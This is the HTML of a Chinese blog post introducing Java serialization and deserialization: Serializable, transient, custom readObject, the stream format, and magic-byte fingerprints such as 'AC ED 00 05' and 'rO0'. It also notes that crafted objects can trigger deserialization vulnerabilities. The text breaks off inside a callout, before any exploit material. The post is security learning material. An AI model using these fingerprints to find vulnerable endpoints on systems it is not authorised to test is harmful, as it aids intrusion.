<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/09/09/java 反序列化/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java 反序列化 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">51</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java 反序列化</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-09-09 00:44:06</span>
        <span class="mobile">2025-09-09 00:44:06</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-09-08 10:04:50</span>
            <span class="mobile">2025-09-08 10:04:50</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>53.2k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>230 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h1><p>Java 的序列化（Serialization）和反序列化（Deserialization）是将对象的状态转换为字节流并恢复的过程。这个过程使对象可以保存到文件、通过网络传输或保存到数据库中，并在稍后恢复成对象。</p>
<ul>
<li><strong>序列化（Serialization）</strong>：将 Java 对象的状态转换为字节流的过程。这使得对象可以保存到文件、发送到其他 JVM 甚至通过网络传输。</li>
<li><strong>反序列化（Deserialization）</strong>：将字节流转换回 Java 对象的过程。这允许恢复先前序列化的对象状态。</li>
</ul>
<h2 id="反序列化功能特征"><a href="#反序列化功能特征" class="headerlink" title="反序列化功能特征"></a>反序列化功能特征</h2><h3 id="压缩特征（压缩后一些数据格式改变）"><a href="#压缩特征（压缩后一些数据格式改变）" class="headerlink" title="压缩特征（压缩后一些数据格式改变）"></a>压缩特征（压缩后一些数据格式改变）</h3><ul>
<li>zip 格式特征：<code>PK*</code></li>
<li>zip+base64：<code>UE*</code></li>
<li>gzip+base64：<code>H4s*</code></li>
</ul>
<h3 id="反序列化数据特征-数据内容-请求类型"><a href="#反序列化数据特征-数据内容-请求类型" class="headerlink" title="反序列化数据特征(数据内容+请求类型)"></a>反序列化数据特征(数据内容+请求类型)</h3><ul>
<li><code>AC ED 00 05</code> in Hex</li>
<li><code>rO0</code> in Base64</li>
<li><code>Content-type = ‘application/x-java-serialized-object</code></li>
</ul>
<h2 id="序列化条件"><a href="#序列化条件" class="headerlink" title="序列化条件"></a>序列化条件</h2><p>要使 Java 对象可序列化，类必须实现 <code>java.io.Serializable</code> 接口。<strong>这个接口是一个标记接口（没有方法），它表明该类的对象可以被序列化</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>; <span class="comment">// 用于版本控制</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructors, getters, and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>serialVersionUID</strong>：每个可序列化类建议定义一个 <code>serialVersionUID</code> 字段，用于版本控制。不同的 <code>serialVersionUID</code> 表示类的不同版本，如果序列化和反序列化的版本不匹配会抛出 <code>InvalidClassException</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>transient 关键字</strong>：声明为 <code>transient</code> 的字段不会被序列化。它用于避免序列化敏感信息或不需要保存的字段。这种字段反序列化后为默认值（如 <code>null</code>）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String password; <span class="comment">// 密码不会被序列化</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>静态字段</strong>：静态字段属于类，而不是实例，因此不会被序列化。</p>
</li>
<li><p><strong>对象图的完整性</strong>：序列化对象时，会递归地序列化其引用的所有对象。因此，引用对象也必须是可序列化的，否则会抛出 <code>NotSerializableException</code>。</p>
</li>
</ul>
<h2 id="序列化接口"><a href="#序列化接口" class="headerlink" title="序列化接口"></a>序列化接口</h2><h3 id="序列化基本用法"><a href="#序列化基本用法" class="headerlink" title="序列化基本用法"></a>序列化基本用法</h3><ul>
<li><p><strong>序列化对象</strong>：使用 <code>ObjectOutputStream</code> 将对象写入（<code>writeObject</code> 方法）到输出流（如文件输出流）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(object);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化对象</strong>：使用 <code>ObjectInputStream</code> 从输入流（如文件输入流）读取（<code>readObject</code> 方法）对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">object = objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="自定义序列化"><a href="#自定义序列化" class="headerlink" title="自定义序列化"></a>自定义序列化</h3><ul>
<li><p><strong>自定义序列化</strong>：通过实现 <code>writeObject</code> 和 <code>readObject</code> 方法，可以自定义序列化和反序列化的行为。<strong>通常精心构造的序列化对象和 readObject 的自定义操作结合就可以造成反序列化漏洞。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    out.defaultWriteObject(); <span class="comment">// 默认序列化</span></span><br><span class="line">    <span class="comment">// 额外的序列化逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject(); <span class="comment">// 默认反序列化</span></span><br><span class="line">    <span class="comment">// 额外的反序列化逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>Externalizable 接口</strong>：<code>Externalizable</code> 是 <code>Serializable</code> 的子接口，它强制实现 <code>writeExternal</code> 和 <code>readExternal</code> 方法，提供完全控制序列化过程的能力。这对性能优化或定制序列化格式非常有用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须有无参数构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="序列化数据结构"><a href="#序列化数据结构" class="headerlink" title="序列化数据结构"></a>序列化数据结构</h2><p>当我们将一个对象（如 <code>new Person(20, &quot;Bob&quot;)</code>）进行 Java 原生序列化（<code>ObjectOutputStream</code>），其输出的数据结构是严格遵守 Java Object Serialization Specification 的格式，包含：</p>
<ul>
<li>顶层流结构（Stream Header）</li>
<li>若干记录（Record），按写入顺序序列化</li>
<li>每个记录前有类型码（type code），表明后续数据的含义</li>
<li>所有对象均带有类描述符、字段值、以及引用句柄机制</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">  String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>写入 <code>new Person(20, &quot;Bob&quot;)</code> 时的结构（示意）：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">AC ED 00 05                               // header</span><br><span class="line">73                                         TC_OBJECT</span><br><span class="line">  72                                       TC_CLASSDESC</span><br><span class="line">    &quot;com.example.Person&quot;                   UTF</span><br><span class="line">    &lt;suid: 8 bytes&gt;                        long</span><br><span class="line">    &lt;flags: SC_SERIALIZABLE&gt;               byte</span><br><span class="line">    00 02                                  fieldCount = 2</span><br><span class="line">      &#x27;I&#x27; &quot;age&quot;                            原始字段</span><br><span class="line">      &#x27;L&#x27; &quot;name&quot; &quot;Ljava/lang/String;&quot;      对象字段</span><br><span class="line">    78                                      TC_ENDBLOCKDATA（类注解块结束，通常为空）</span><br><span class="line">    70                                      TC_NULL（super desc of Object）</span><br><span class="line">  // classdata for Person（默认字段，无 ENDBLOCKDATA）</span><br><span class="line">  00 00 00 14                              age = 20</span><br><span class="line">  74                                       TC_STRING</span><br><span class="line">    &quot;Bob&quot;                                  UTF</span><br></pre></td></tr></table></figure></div>

<h3 id="顶层结构"><a href="#顶层结构" class="headerlink" title="顶层结构"></a>顶层结构</h3><p>通常序列化数据前面会有一个固定的字段作为魔数，标识这是一段 Java 对象的序列化数据：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC  STREAM_VERSION  Record*</span><br><span class="line">AC ED          00 05          ...</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>STREAM_MAGIC</strong>：<code>AC ED</code></li>
<li><strong>STREAM_VERSION</strong>：<code>00 05</code></li>
<li><strong>Record</strong>*：后面紧跟一个或多个记录（对象、类描述符、字符串、数组、引用、块数据、异常等），<strong>顺序完全由写端决定</strong>。</li>
</ul>
<p>我们可以通过这个魔数来识别序列化数据，下面是一些常见编码下的特征：</p>
<ul>
<li><p>原始序列：<code>AC ED 00 05</code></p>
</li>
<li><p>Base64：<code>rO0</code></p>
</li>
<li><p>zip 格式：<code>PK*</code></p>
</li>
<li><p>zip+base64：<code>UE*</code></p>
</li>
<li><p>gzip+base64：<code>H4s*</code></p>
</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
